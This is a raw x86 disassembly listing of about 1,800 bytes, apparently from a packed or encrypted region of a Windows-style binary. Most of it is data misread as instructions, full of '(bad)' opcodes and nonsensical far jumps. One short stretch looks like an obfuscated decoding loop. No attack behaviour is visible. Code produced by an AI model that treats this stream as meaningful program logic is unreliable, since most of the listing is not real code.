  40c617:	cwde   
  40c618:	js     0x40c692
  40c61a:	je     0x40c69a
  40c61c:	js     0x40c696
  40c61e:	shl    DWORD PTR [ebx-0x7a],0x33
  40c622:	popa   
  40c623:	adc    esi,DWORD PTR [ebp-0x18]
  40c626:	rcr    BYTE PTR [ebx+ebp*8-0x2f],0x5f
  40c62b:	(bad)  
  40c62c:	icebp  
  40c62d:	into   
  40c62e:	sub    DWORD PTR [esi+0x16f97a28],0xffffffe5
  40c635:	sub    DWORD PTR [ecx+eiz*8+0x28],ebp
  40c639:	shr    DWORD PTR [eax+0x155a0d30],1
  40c63f:	mov    ebx,0x4097d16a
  40c644:	nop
  40c645:	cmp    eax,0x2e155264
  40c64a:	push   ebp
  40c64b:	pop    esp
  40c64c:	inc    eax
  40c64d:	test   DWORD PTR [eax-0x11],esi
  40c650:	mov    DWORD PTR [edx+0x68],ebp
  40c653:	pushf  
  40c654:	jp     0x40c5e8
  40c656:	call   0xa46753f0
  40c65b:	ins    DWORD PTR es:[edi],dx
  40c65c:	jecxz  0x40c5e4
  40c65e:	adc    al,dl
  40c660:	fsub   DWORD PTR [eax]
  40c662:	mov    dh,BYTE PTR [edx-0xdd935bd]
  40c668:	(bad)  
  40c669:	fdivr  DWORD PTR [ebx-0x6933dcb5]
  40c66f:	out    0xfb,al
  40c671:	push   edi
  40c672:	ret    
  40c673:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c674:	ror    esp,0x10
  40c677:	in     al,0x76
  40c679:	imul   ebx,DWORD PTR [esi],0x1a
  40c67c:	fwait
  40c67d:	inc    esp
  40c67e:	(bad)  
  40c67f:	and    DWORD PTR [ebx+edi*4+0xe8e8bc7],ecx
  40c686:	jo     0x40c703
  40c688:	mov    esi,edx
  40c68a:	daa    
  40c68b:	(bad)  
  40c68c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c68d:	fcomp  QWORD PTR [eax+0x6a]
  40c690:	je     0x40c6a2
  40c692:	inc    esp
  40c693:	mov    ebx,0x48952f9c
  40c698:	inc    ebx
  40c699:	add    al,0x70
  40c69b:	add    bl,BYTE PTR [ebp-0x3e]
  40c69e:	neg    BYTE PTR [ecx+0x4beb80c7]
  40c6a4:	jae    0x40c657
  40c6a6:	fistp  WORD PTR [ebx+ebx*2]
  40c6a9:	js     0x40c6b8
  40c6ab:	les    edi,FWORD PTR [ecx-0x6d]
  40c6ae:	or     edx,0xe14bbd7
  40c6b4:	mov    dl,0x4
  40c6b6:	shr    DWORD PTR [ebx+ebx*8],0x26
  40c6ba:	cmp    eax,0x7a01e12
  40c6bf:	jle    0x40c6d5
  40c6c1:	lock mov gs:0xff675107,al
  40c6c8:	and    ecx,DWORD PTR [ecx]
  40c6ca:	sub    bh,BYTE PTR [ebx-0xe]
  40c6cd:	xor    bh,BYTE PTR [eax+0x6]
  40c6d0:	push   cs
  40c6d1:	sub    al,0x54
  40c6d3:	(bad)  
  40c6d4:	dec    eax
  40c6d5:	cmp    esp,DWORD PTR [eax-0x3d]
  40c6d8:	aaa    
  40c6d9:	btc    DWORD PTR [esi],ecx
  40c6dc:	aaa    
  40c6dd:	popa   
  40c6de:	pop    ss
  40c6df:	push   0x29ebc04d
  40c6e4:	sub    ah,BYTE PTR [ebx-0x14ee7100]
  40c6ea:	fwait
  40c6eb:	out    0x1f,eax
  40c6ed:	push   0x55
  40c6ef:	sub    ch,dh
  40c6f1:	sbb    DWORD PTR [ecx],eax
  40c6f3:	push   0xfffffffb
  40c6f5:	(bad)  
  40c6f6:	push   esp
  40c6f7:	mov    ebx,?
  40c6f9:	pushf  
  40c6fa:	jo     0x40c6e3
  40c6fc:	into   
  40c6fd:	pushf  
  40c6fe:	xchg   edx,eax
  40c6ff:	mov    eax,0xd3a65297
  40c704:	fild   QWORD PTR [eax-0x6d0ee408]
  40c70a:	in     al,0xae
  40c70c:	stc    
  40c70d:	push   ebp
  40c70e:	mov    esi,0x86815dc4
  40c713:	mov    dl,0x35
  40c715:	jne    0x40c6d1
  40c717:	das    
  40c718:	push   ebx
  40c719:	xchg   esp,eax
  40c71a:	std    
  40c71b:	cli    
  40c71c:	sbb    eax,0x39d33b02
  40c721:	lahf   
  40c722:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c723:	aad    0xa4
  40c725:	mov    ds,esi
  40c727:	mov    ch,0x61
  40c729:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c72a:	push   edi
  40c72b:	sbb    dh,BYTE PTR ds:0xcbdc6802
  40c731:	rcl    DWORD PTR [esi+0x6d],1
  40c734:	hlt    
  40c735:	cld    
  40c736:	repnz and BYTE PTR [ebp+0x31080859],ah
  40c73d:	lock dec edi
  40c73f:	loope  0x40c7bd
  40c741:	cmp    al,0x31
  40c743:	mov    dh,0xc
  40c745:	push   es
  40c746:	add    ebx,eax
  40c748:	out    0xbc,eax
  40c74a:	mov    ecx,es
  40c74c:	or     bh,BYTE PTR [eax-0x64c7858f]
  40c752:	inc    esp
  40c753:	out    0xe8,al
  40c755:	pop    edx
  40c756:	(bad)  
  40c757:	fmul   QWORD PTR [edx]
  40c759:	ins    DWORD PTR es:[edi],dx
  40c75a:	mov    edi,0xb826dc50
  40c75f:	jno    0x40c6e7
  40c761:	and    eax,0x65edf7c
  40c766:	or     eax,DWORD PTR [edx]
  40c768:	sbb    ebp,ebp
  40c76a:	fnstsw WORD PTR [ecx]
  40c76c:	stos   DWORD PTR es:[edi],eax
  40c76d:	fs dec ebx
  40c76f:	rcr    BYTE PTR [ebp-0xa3bed23],0x86
  40c776:	xchg   edx,eax
  40c777:	sub    al,0x85
  40c779:	xor    eax,0xb07800e6
  40c77e:	add    eax,0xc0096f36
  40c783:	sbb    al,0x61
  40c785:	lods   al,BYTE PTR ds:[esi]
  40c786:	scas   eax,DWORD PTR es:[edi]
  40c787:	(bad)  
  40c788:	ins    BYTE PTR es:[edi],dx
  40c789:	out    dx,eax
  40c78a:	xchg   esi,eax
  40c78b:	push   ebx
  40c78c:	sub    bh,BYTE PTR [ecx]
  40c78e:	add    dl,dl
  40c790:	add    al,0x31
  40c792:	aaa    
  40c793:	repnz stc 
  40c795:	jecxz  0x40c74e
  40c797:	stos   BYTE PTR es:[edi],al
  40c798:	push   eax
  40c799:	lods   al,BYTE PTR ds:[esi]
  40c79a:	sbb    al,BYTE PTR [eax+0x52]
  40c79d:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c79f:	jne    0x40c7eb
  40c7a1:	fnstcw WORD PTR [ebx-0x63]
  40c7a4:	and    BYTE PTR [esi+0x28],dh
  40c7a7:	stos   DWORD PTR es:[edi],eax
  40c7a8:	dec    esp
  40c7a9:	push   edx
  40c7aa:	sbb    bl,bl
  40c7ac:	or     DWORD PTR [ecx],edx
  40c7ae:	mov    ch,0x65
  40c7b0:	sbb    ebp,DWORD PTR [esi-0x6e4f6369]
  40c7b6:	fisttp DWORD PTR [ebx-0x1]
  40c7b9:	mov    BYTE PTR [edx-0x6d],bl
  40c7bc:	mov    BYTE PTR [ecx],bl
  40c7be:	pop    eax
  40c7bf:	sbb    ebp,edi
  40c7c1:	add    cl,BYTE PTR [eax-0x7d]
  40c7c4:	clc    
  40c7c5:	inc    ebx
  40c7c6:	jo     0x40c78c
  40c7c8:	pop    ds
  40c7c9:	push   ebx
  40c7ca:	movnti DWORD PTR [ebx+0x18],esi
  40c7ce:	imul   ecx,DWORD PTR [eax-0x5ae82b70],0xffffffcb
  40c7d5:	jmp    0x9b33:0xf7797b9
  40c7dc:	sbb    DWORD PTR [ebx+ecx*2+0x4],esi
  40c7e0:	xor    esi,DWORD PTR ds:0xdd3f5297
  40c7e6:	pop    ecx
  40c7e7:	in     al,0x27
  40c7e9:	call   0x6bb57de1
  40c7ee:	push   cs
  40c7ef:	cmp    ah,dl
  40c7f1:	(bad)  
  40c7f2:	out    dx,al
  40c7f3:	in     eax,dx
  40c7f4:	xchg   esi,eax
  40c7f5:	js     0x40c781
  40c7f7:	or     DWORD PTR [edx],esp
  40c7f9:	or     eax,0xba877485
  40c7fe:	jnp    0x40c87f
  40c800:	dec    di
  40c802:	arpl   WORD PTR [esi+0x1bb7e885],dx
  40c808:	xchg   ebp,eax
  40c809:	push   esi
  40c80a:	jge    0x40c79c
  40c80c:	nop
  40c80d:	adc    al,0x19
  40c80f:	pop    esi
  40c810:	in     al,dx
  40c811:	fdivr  QWORD PTR [edx+0x603a6101]
  40c817:	pop    edi
  40c818:	fwait
  40c819:	imul   esi,edx,0xef3bd0df
  40c81f:	(bad)
  40c823:	dec    esi
  40c824:	adc    esp,ecx
  40c826:	ins    BYTE PTR es:[edi],dx
  40c827:	push   esi
  40c828:	(bad)  
  40c82a:	add    ch,ch
  40c82c:	mov    al,ds:0xe1792553
  40c831:	mov    dl,0x24
  40c833:	sbb    DWORD PTR [ebx+ecx*4+0x10e27c8f],esi
  40c83a:	cmp    DWORD PTR [edi-0x2c6fab1e],edi
  40c840:	xchg   BYTE PTR [edi+0x18d0466e],dh
  40c846:	mov    dh,BYTE PTR [ebp-0x43]
  40c849:	jg     0x40c7f2
  40c84b:	pop    eax
  40c84c:	jmp    0x40c86a
  40c84e:	jne    0x40c856
  40c850:	xor    ah,ch
  40c852:	sub    edx,eax
  40c854:	xor    eax,0x55dc5d8
  40c859:	je     0x40c83c
  40c85b:	xchg   ebx,eax
  40c85c:	mov    dh,dl
  40c85e:	and    al,0xfc
  40c860:	addr16 dec edx
  40c862:	push   ebx
  40c863:	sub    al,0x9f
  40c865:	xchg   ecx,eax
  40c866:	pusha  
  40c867:	call   0x30268108
  40c86c:	dec    esi
  40c86d:	mov    bh,0x8d
  40c86f:	sub    DWORD PTR [edx+0x10],edx
  40c872:	push   ecx
  40c873:	in     al,dx
  40c874:	cld    
  40c875:	push   ds
  40c876:	push   ebp
  40c877:	(bad)
  40c87a:	pusha  
  40c87b:	sti    
  40c87c:	adc    bl,BYTE PTR [ebp-0x6a399363]
  40c882:	out    0xd3,al
  40c884:	clc    
  40c885:	inc    ebx
  40c886:	js     0x40c856
  40c888:	inc    ecx
  40c889:	push   ss
  40c88a:	pop    esp
  40c88b:	cwde   
  40c88c:	ror    edx,0x5b
  40c88f:	lahf   
  40c890:	mov    eax,0x3a0ee8f9
  40c895:	xor    ebp,DWORD PTR ds:0x9701387d
  40c89b:	rol    BYTE PTR [ebx-0x3bcaf6f3],0x88
  40c8a2:	pop    esp
  40c8a3:	pop    ebx
  40c8a4:	in     al,dx
  40c8a5:	hlt    
  40c8a6:	(bad)  
  40c8a8:	adc    eax,0x787e551c
  40c8ad:	mov    bl,0x99
  40c8af:	addr16 jge 0x40c852
  40c8b2:	sbb    ebx,ecx
  40c8b4:	test   BYTE PTR [eax+0x66],0x3a
  40c8b8:	scas   eax,DWORD PTR es:[edi]
  40c8b9:	adc    BYTE PTR ds:0x663787f6,0xce
  40c8c0:	ins    BYTE PTR es:[edi],dx
  40c8c1:	xchg   di,ax
  40c8c3:	adc    DWORD PTR ds:0xc1fb1fb2,ebp
  40c8c9:	int    0xe
  40c8cb:	into   
  40c8cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8cd:	mov    ecx,0xe39b2afa
  40c8d2:	push   ss
  40c8d3:	add    ebx,ebx
  40c8d5:	sub    eax,0x7fd1e20a
  40c8da:	pop    edx
  40c8db:	lods   eax,DWORD PTR ds:[esi]
  40c8dc:	mov    dh,0x28
  40c8de:	mov    BYTE PTR [esi-0x67670b30],al
  40c8e4:	pop    ss
  40c8e5:	mov    eax,0xbbba8321
  40c8ea:	sub    al,0xf5
  40c8ec:	jne    0x40c90a
  40c8ee:	loopne 0x40c913
  40c8f0:	lds    ebp,FWORD PTR [ecx-0x3b]
  40c8f3:	pop    es
  40c8f4:	outs   dx,BYTE PTR ds:[esi]
  40c8f5:	out    dx,al
  40c8f6:	popf   
  40c8f7:	jmp    0x56effd2a
  40c8fc:	adc    DWORD PTR [edx],edx
  40c8fe:	(bad)  
  40c8ff:	xor    al,0x7d
  40c901:	rcl    ebx,0x1e
  40c904:	inc    esp
  40c905:	push   eax
  40c906:	adc    al,0x76
  40c908:	imul   esp,DWORD PTR [eax+ebx*8],0x2a
  40c90c:	repz jno 0x40c95a
  40c90f:	clc    
  40c910:	and    BYTE PTR [ecx+0x7c33d00c],0xa
  40c917:	shr    DWORD PTR [ebp-0x1fba7468],cl
  40c91d:	mov    edx,DWORD PTR [ebp-0x8]
  40c920:	mov    edi,DWORD PTR [ebp-0x24]
  40c923:	xor    edx,ecx
  40c925:	add    edx,esi
  40c927:	imul   edx,edi
  40c92a:	sub    DWORD PTR [eax],edx
  40c92c:	mov    eax,DWORD PTR [ebp-0x14]
  40c92f:	jmp    0x40b5ea
  40c934:	mov    eax,DWORD PTR [ebp-0xc]
  40c937:	mov    edx,DWORD PTR [ebp-0x18]
  40c93a:	xor    eax,edx
  40c93c:	cmp    eax,0x7a0d5426
  40c941:	je     0x40b5e7
  40c947:	mov    eax,DWORD PTR [ebp-0x10]
  40c94a:	add    DWORD PTR [eax],0x7403502
  40c950:	jmp    0x40b5e7
  40c955:	mov    eax,DWORD PTR [ebp-0x1c]
  40c958:	jmp    0x40cc71
  40c95d:	rol    ebx,cl
  40c95f:	(bad)
  40c962:	leave  
  40c963:	rcr    ebx,1
  40c965:	mov    al,ds:0xc84c5e53
  40c96a:	cmp    BYTE PTR [ebx+0x789d32a5],dh
  40c970:	js     0x40c9e6
  40c972:	jle    0x40c9ec
  40c974:	js     0x40c945
  40c976:	fdiv   DWORD PTR [edi+0x6234fbb7]
  40c97c:	lea    ebp,[ecx+esi*1-0x3988a553]
  40c983:	sub    dl,BYTE PTR [eax+eax*1]
  40c986:	js     0x40c98c
  40c988:	or     BYTE PTR [ebp+0x42773f89],0xba
  40c98f:	dec    ebp
  40c990:	sti    
  40c991:	std    
  40c992:	sbb    eax,0x669fe11c
  40c997:	aad    0xe4
  40c999:	ja     0x40c983
  40c99b:	pop    eax
  40c99c:	into   
  40c99d:	push   ss
  40c99e:	jnp    0x40c978
  40c9a0:	jmp    0x40c962
  40c9a2:	dec    edi
  40c9a3:	xor    ecx,DWORD PTR [esi+eiz*2]
  40c9a6:	and    ch,BYTE PTR [ebx-0x2f]
  40c9a9:	sub    BYTE PTR ss:[edx],dh
  40c9ac:	mov    dh,0xde
  40c9ae:	loope  0x40c9b9
  40c9b0:	fs (bad) 
  40c9b2:	cmp    DWORD PTR [esi],ebp
  40c9b4:	pop    ds
  40c9b5:	lahf   
  40c9b6:	push   ebp
  40c9b7:	jb     0x40c9f6
  40c9b9:	and    BYTE PTR [eax-0x3b9ff616],bh
  40c9bf:	xor    ecx,DWORD PTR [ebx-0x5]
  40c9c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9c3:	stos   DWORD PTR es:[edi],eax
  40c9c4:	popa   
  40c9c5:	nop
  40c9c6:	xchg   esi,eax
  40c9c7:	aad    0x84
  40c9c9:	mov    ds:0x57a240d3,al
  40c9ce:	mov    ds:0xf3aaded5,eax
  40c9d3:	xor    BYTE PTR [ecx+0x5],dl
  40c9d6:	xchg   edi,eax
  40c9d7:	test   DWORD PTR [eax+edx*4],esp
  40c9da:	mov    edi,0x725a696d
  40c9df:	into   
  40c9e0:	jo     0x40ca21
  40c9e2:	pop    ds
  40c9e3:	adc    BYTE PTR [eax*4-0x349ae668],dl
  40c9ea:	es cli 
  40c9ec:	iret   
  40c9ed:	mov    ds:0xded6c6e,al
  40c9f2:	and    DWORD PTR [ebp-0x7],0x76
  40c9f6:	cmp    ecx,DWORD PTR [ecx]
  40c9f8:	ja     0x40c9f0
  40c9fa:	dec    ebx
  40c9fb:	retf   
  40c9fc:	xchg   esp,eax
  40c9fd:	inc    esp
  40c9fe:	jb     0x40c9f1
  40ca00:	push   0x8a1ca258
  40ca05:	mov    ebx,eax
  40ca07:	dec    edx
  40ca08:	inc    eax
  40ca09:	fcmovbe st,st(7)
  40ca0b:	mov    ds:0x25ea055b,al
  40ca10:	(bad)  [edx]
  40ca12:	cli    
  40ca13:	and    eax,0x4e2b01cd
  40ca18:	aam    0x42
  40ca1a:	aaa    
  40ca1b:	push   edx
  40ca1c:	std    
  40ca1d:	or     dl,BYTE PTR [edx]
  40ca1f:	mov    ebx,0x2d2b85ea
  40ca24:	fst    st(1)
  40ca26:	ret    0xf07c
  40ca29:	mov    bh,0x1e
  40ca2b:	add    bl,ch
  40ca2d:	inc    ecx
  40ca2e:	popa   
  40ca2f:	add    eax,ebx
  40ca31:	jg     0x40ca88
  40ca33:	stc    
  40ca34:	mov    ds:0xf9b4cb26,al
  40ca39:	retf   
  40ca3a:	or     al,0x96
  40ca3c:	test   eax,0xbb589403
  40ca41:	daa    
  40ca42:	ficomp DWORD PTR [edi+0x1e3bd838]
  40ca48:	inc    edi
  40ca49:	retf   
  40ca4a:	inc    edx
  40ca4b:	dec    ecx
  40ca4c:	cs aam 0x1c
  40ca4f:	stos   BYTE PTR es:[edi],al
  40ca50:	dec    esp
  40ca51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca52:	push   0x35
  40ca54:	sbb    eax,0x874850ff
  40ca59:	pop    esp
  40ca5a:	xchg   ebx,eax
  40ca5b:	retf   0x1756
  40ca5e:	cwde   
  40ca5f:	repnz lock sbb eax,DWORD PTR [edi+0x7e]
  40ca64:	in     al,0xaa
  40ca66:	adc    DWORD PTR [edi],eax
  40ca68:	push   edx
  40ca69:	iret   
  40ca6a:	loope  0x40ca44
  40ca6c:	loop   0x40ca5e
  40ca6e:	adc    dh,BYTE PTR [ebx+0x1d]
  40ca71:	mov    ecx,0x225647d8
  40ca76:	dec    dl
  40ca78:	jne    0x40cabe
  40ca7a:	push   eax
  40ca7b:	pop    ds
  40ca7c:	mov    ch,0x72
  40ca7e:	aad    0x45
  40ca80:	nop
  40ca81:	fst    QWORD PTR [edx+0x3a]
  40ca84:	sbb    BYTE PTR [edx],dl
  40ca86:	arpl   WORD PTR [edi-0x742ae589],cx
  40ca8c:	mov    edx,0xbf932ccf
  40ca91:	cmp    DWORD PTR [ebp*8+0x1478fcbe],ebp
  40ca98:	sub    al,0x69
  40ca9a:	mov    dh,0x9a
  40ca9c:	jge    0x40ca9e
  40ca9e:	add    edx,0xf529ecd6
  40caa4:	scas   eax,DWORD PTR es:[edi]
  40caa5:	ds cdq 
  40caa7:	push   cs
  40caa8:	outs   dx,BYTE PTR ds:[esi]
  40caa9:	lahf   
  40caaa:	scas   eax,DWORD PTR es:[edi]
  40caab:	xor    al,0x59
  40caad:	call   0x342a:0x8e8b6797
  40cab4:	pop    es
  40cab5:	jb     0x40cb31
  40cab7:	loop   0x40ca7f
  40cab9:	xor    al,0x22
  40cabb:	(bad)  
  40cabc:	sub    eax,0xe29c0606
  40cac1:	bound  edx,QWORD PTR [ebx+edx*2+0x5a91e585]
  40cac8:	ja     0x40cac2
  40caca:	popf   
  40cacb:	push   cs
  40cacc:	jmp    0x8ab2:0x55dc9296
  40cad3:	adc    BYTE PTR [edi+edx*2-0x176ff117],dh
  40cada:	repz sbb BYTE PTR [eax],cl
  40cadd:	aas    
  40cade:	out    dx,al
  40cadf:	jecxz  0x40cb16
  40cae1:	jnp    0x40ca9f
  40cae3:	push   ebp
  40cae4:	jb     0x40ca77
  40cae6:	push   eax
  40cae7:	adc    eax,0x2e2c3b5f
  40caec:	or     al,0xc9
  40caee:	test   BYTE PTR [esi-0x6f],0x88
  40caf2:	add    eax,0x52e420a9
  40caf7:	imul   ebp,esi,0xffffff96
  40cafa:	mov    bl,0xef
  40cafc:	fisubr DWORD PTR [eax-0x431e8ea1]
  40cb02:	pushf  
  40cb03:	jl     0x40cb07
  40cb05:	xchg   ebp,eax
  40cb06:	pop    eax
  40cb07:	xchg   esi,eax
  40cb08:	and    DWORD PTR [edx],edi
  40cb0a:	jo     0x40cac1
  40cb0c:	out    0xad,eax
  40cb0e:	in     al,0x77
  40cb10:	cmp    DWORD PTR [ecx+0x2b0e48be],edi
  40cb16:	inc    ebx
  40cb17:	mov    ecx,0x9d8bcd0b
  40cb1c:	stos   DWORD PTR es:[edi],eax
  40cb1d:	sbb    DWORD PTR [ebx-0x64],0xffffff82
  40cb21:	test   ch,0x63
  40cb24:	es push ss
  40cb26:	sub    al,0xa1
  40cb28:	sub    al,0x26
  40cb2a:	loop   0x40caec
  40cb2c:	jl     0x40caf9
  40cb2e:	(bad)  [eax-0x1a]
  40cb31:	jecxz  0x40cb09
  40cb33:	pop    esp
  40cb34:	enter  0x172b,0x67
  40cb38:	and    edx,DWORD PTR [eax]
  40cb3a:	mov    DWORD PTR fs:[ebx-0x5a4c5efe],eax
  40cb41:	jg     0x40cb6e
  40cb43:	stc    
  40cb44:	das    
  40cb45:	push   ebx
  40cb46:	jae    0x40cb80
  40cb48:	xlat   BYTE PTR ds:[ebx]
  40cb49:	jnp    0x40cb10
  40cb4b:	or     DWORD PTR [ebx+0x48],edx
  40cb4e:	add    BYTE PTR [eax+eiz*2],bl
  40cb51:	pushf  
  40cb52:	pop    ss
  40cb53:	mov    bh,0x7d
  40cb55:	adc    DWORD PTR [eax],esp
  40cb57:	ror    ebp,cl
  40cb59:	popf   
  40cb5a:	dec    ecx
  40cb5b:	(bad)  
  40cb5c:	jecxz  0x40cbd8
  40cb5e:	cmp    al,0xf5
  40cb60:	xchg   ebp,eax
  40cb61:	out    dx,al
  40cb62:	loopne 0x40caf2
  40cb64:	inc    esp
  40cb65:	cmp    edx,DWORD PTR [edi]
  40cb67:	cmp    DWORD PTR [ecx],esi
  40cb69:	xor    DWORD PTR [edi+0x215a853d],0xffffffe7
  40cb70:	hlt    
  40cb71:	adc    ebx,ebp
  40cb73:	pop    ss
  40cb74:	inc    edx
  40cb75:	stos   DWORD PTR es:[edi],eax
  40cb76:	cmp    al,0xf3
  40cb78:	push   esp
  40cb79:	js     0x40cbd2
  40cb7b:	mov    bl,BYTE PTR [eax+ebp*4+0x12dcfc08]
  40cb82:	inc    ebp
  40cb83:	xor    eax,0x7f208164
  40cb88:	in     al,dx
  40cb89:	dec    esp
  40cb8a:	iret   
  40cb8b:	mov    ch,0x4e
  40cb8d:	xor    DWORD PTR [ecx],0xffffffb0
  40cb90:	dec    ecx
  40cb91:	inc    esi
  40cb92:	mov    esi,0xc1b09cbd
  40cb97:	jl     0x40cb53
  40cb99:	push   0xffffff93
  40cb9b:	lods   al,BYTE PTR ds:[esi]
  40cb9c:	ins    BYTE PTR es:[edi],dx
  40cb9d:	mov    eax,ds:0xdd8e198a
  40cba2:	cdq    
  40cba3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cba4:	test   DWORD PTR [ecx+0x79],ebp
  40cba7:	push   esp
  40cba8:	cmc    
  40cba9:	mov    al,ds:0xabe492da
  40cbae:	fsubr  DWORD PTR [ebx+0x6252b34]
  40cbb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbb5:	mov    bh,0x63
  40cbb7:	jg     0x40cbae
  40cbb9:	ret    0x1f94
  40cbbc:	mov    ah,BYTE PTR [ecx-0xf40ee1f]
  40cbc2:	inc    di
  40cbc4:	bound  edx,QWORD PTR [edi-0x7c]
  40cbc7:	lods   al,BYTE PTR ds:[esi]
  40cbc8:	and    BYTE PTR [edi+0x3e],cl
  40cbcb:	fwait
  40cbcc:	inc    esi
  40cbcd:	pop    eax
  40cbce:	fwait
  40cbcf:	vpaddw ymm6{k2}{z},ymm7,YMMWORD PTR [ebx-0x1510f3d9]
  40cbd9:	push   0x4a
  40cbdb:	xchg   ebx,eax
  40cbdc:	les    edi,FWORD PTR [eax-0x63325fee]
  40cbe2:	add    al,0x61
  40cbe4:	test   eax,0x62fcd7d4
  40cbe9:	cmp    ebx,DWORD PTR [esi-0x56]
  40cbec:	in     eax,0xb9
  40cbee:	repz mov edx,0x888bca26
  40cbf4:	push   esi
  40cbf5:	pop    ebx
  40cbf6:	xchg   BYTE PTR ds:0x73bfbc57,al
  40cbfc:	push   cs
  40cbfd:	inc    edi
  40cbfe:	mov    esp,0x4dde671b
  40cc03:	mov    edx,0x46b8278
  40cc08:	(bad)  
  40cc09:	inc    edx
  40cc0a:	jp     0x40cbb5
  40cc0c:	jmp    0x489:0x9820219f
  40cc13:	add    al,0xc4
  40cc15:	xlat   BYTE PTR ds:[ebx]
  40cc16:	jmp    0xe04cfed4
  40cc1b:	mov    al,0xa6
  40cc1d:	out    dx,eax
  40cc1e:	push   esp
  40cc1f:	test   ecx,esp
  40cc21:	and    ebx,edi
  40cc23:	shl    DWORD PTR [edx+0x16],1
  40cc26:	popf   
  40cc27:	dec    esp
  40cc28:	das    
  40cc29:	push   cs
  40cc2a:	fimul  DWORD PTR ds:0x45b6743e
  40cc30:	cs jecxz 0x40cc4c
  40cc33:	xchg   ebp,eax
  40cc34:	jo     0x40cc9e
  40cc36:	ss pop ds
  40cc38:	mov    esi,0x34f70254
  40cc3d:	or     ebp,DWORD PTR [ebx-0x37]
  40cc40:	popf   
  40cc41:	inc    esi
  40cc42:	mov    DWORD PTR [ecx],esp
  40cc44:	shr    DWORD PTR [edx+0x3ac3e96d],1
  40cc4a:	(bad)  
  40cc4b:	imul   DWORD PTR [edx+0x75c127b8]
  40cc51:	dec    ebx
  40cc52:	mov    ch,0x82
  40cc54:	xor    BYTE PTR [eax-0x17],bl
  40cc57:	jbe    0x40cc2f
  40cc59:	mov    cl,BYTE PTR [eax]
  40cc5b:	into   
  40cc5c:	sub    eax,0xc0fa77a3
  40cc61:	lock daa 
  40cc63:	dec    esp
  40cc64:	push   si
  40cc66:	mov    ds:0xb13ccd3e,eax
  40cc6b:	popa   
  40cc6c:	mov    ecx,0x1a4f8de4
  40cc71:	cmp    DWORD PTR [eax],edi
  40cc73:	jmp    0x40cf8c
  40cc78:	(bad)  
  40cc79:	(bad)  
  40cc7a:	rol    esp,1
  40cc7c:	ror    ebx,1
  40cc7e:	aad    0xda
  40cc80:	xchg   esi,eax
  40cc81:	mov    dl,0x71
  40cc83:	aad    0xff
  40cc85:	repnz lds edx,FWORD PTR [edi+0x2e]
  40cc89:	mov    ds:0x7e747878,al
  40cc8e:	js     0x40cd08
  40cc90:	or     dl,ch
  40cc92:	ds cld 
  40cc94:	or     eax,0x80855174
  40cc99:	enter  0xf452,0x27
  40cc9d:	cmp    BYTE PTR [edi+0x517d1837],bh
  40cca3:	push   edi
  40cca4:	add    al,0xf5
  40cca6:	push   ecx
  40cca7:	fimul  WORD PTR [edi]
  40cca9:	ret    
  40ccaa:	pmaxub mm2,QWORD PTR [esi-0x2e228a39]
  40ccb1:	mov    bh,0xc4
  40ccb3:	inc    esi
  40ccb4:	sub    edi,DWORD PTR [eax+0x63]
  40ccb7:	ja     0x40cc48
  40ccb9:	enter  0xa771,0x14
  40ccbd:	lea    esi,[esi]
  40ccbf:	mov    al,0x6b
  40ccc1:	mov    esi,0x82f1c9d7
  40ccc6:	icebp  
  40ccc7:	rcr    BYTE PTR [edx+0x7d],cl
  40ccca:	xor    al,bl
  40cccc:	push   ss
  40cccd:	addr16 sub eax,0x67f039cc
  40ccd3:	xchg   edi,eax
  40ccd4:	or     al,0x67
  40ccd6:	inc    edi
  40ccd7:	std    
  40ccd8:	cmc    
  40ccd9:	ss fwait
  40ccdb:	test   eax,0x83d604bb
  40cce0:	js     0x40ccd7
  40cce2:	rep stos BYTE PTR es:[edi],al
  40cce4:	mov    ch,0x9f
  40cce6:	loop   0x40cd11
  40cce8:	(bad)  
  40cce9:	jp     0x40cc94
  40cceb:	into   
  40ccec:	mov    ecx,0x1de36535
  40ccf1:	ins    BYTE PTR es:[edi],dx
  40ccf2:	push   esp
  40ccf3:	cmp    eax,0x1ead737f
  40ccf8:	add    BYTE PTR [ebx+0x1f],0xac
  40ccfc:	push   ecx
  40ccfd:	mov    esp,0x98547917
  40cd02:	out    0x1d,eax
  40cd04:	push   0x96065f5a
  40cd09:	jg     0x40cce2
  40cd0b:	aas    
  40cd0c:	add    al,0x73
  40cd0e:	adc    al,0xf0
  40cd10:	sbb    DWORD PTR ds:0xc99e71ee,edx
  40cd16:	push   eax
  40cd17:	mov    esi,0xb3a78ce8
  40cd1c:	jno    0x40ccf8
  40cd1e:	jge    0x40cd1b
  40cd20:	in     al,dx
  40cd21:	aas    
  40cd22:	idiv   DWORD PTR [ebx+0x5a530544]
  40cd28:	cmp    bh,BYTE PTR [edi+0x17]
  40cd2b:	(bad)  [edx]
  40cd2d:	sub    BYTE PTR [edi-0x17],dh
  40cd30:	mov    dh,0x31
  40cd32:	in     eax,0xbb
  40cd34:	imul   ebx,esi,0xd8394f63
  40cd3a:	lods   eax,DWORD PTR ds:[esi]
  40cd3b:	call   0xbbbe7912
  40cd40:	arpl   WORD PTR [edi+0x6b],sp
  40cd43:	inc    esi
  40cd44:	cli    
  40cd45:	add    ebp,DWORD PTR [esi-0x19267a31]
  40cd4b:	mov    dl,0x80
  40cd4d:	lock in al,0x81
  40cd50:	push   ebp
  40cd51:	sahf   
  40cd52:	cli    
  40cd53:	dec    edx
  40cd54:	das    
  40cd55:	test   BYTE PTR [ebx-0x36fef9cf],0x3
  40cd5c:	daa    
  40cd5d:	fwait
  40cd5e:	xlat   BYTE PTR ds:[ebx]
  40cd5f:	pop    es
  40cd60:	add    al,BYTE PTR [eax]
  40cd62:	frstor [edx-0x199ffb4f]
  40cd68:	imul   ebp,DWORD PTR [ecx+0x1b],0xffffffaf
  40cd6c:	xchg   edi,eax
  40cd6d:	cmp    eax,0x58c8d9ee
  40cd72:	xchg   edx,eax
  40cd73:	lahf   
  40cd74:	outs   dx,BYTE PTR ds:[esi]
  40cd75:	pop    edx
